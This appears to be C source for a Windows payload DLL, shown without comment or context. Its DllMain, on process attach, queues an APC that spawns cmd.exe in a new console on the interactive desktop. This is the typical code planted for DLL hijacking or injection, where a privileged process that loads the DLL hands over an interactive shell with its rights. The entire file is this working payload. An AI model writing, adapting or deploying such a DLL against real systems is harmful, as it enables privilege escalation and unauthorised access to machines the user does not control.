#include <Windows.h>

VOID CALLBACK SpawnCmdApc(ULONG_PTR dwParam)
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    (void)dwParam;

    si.cb = sizeof(si);
    si.lpDesktop = L"WinSta0\\Default";

    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
                   NULL,
                   NULL,
                   NULL,
                   FALSE,
                   CREATE_NEW_CONSOLE,
                   NULL,
                   NULL,
                   &si,
                   &pi);

    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        QueueUserAPC(SpawnCmdApc, GetCurrentThread(), 0);
    }

    return TRUE;
}
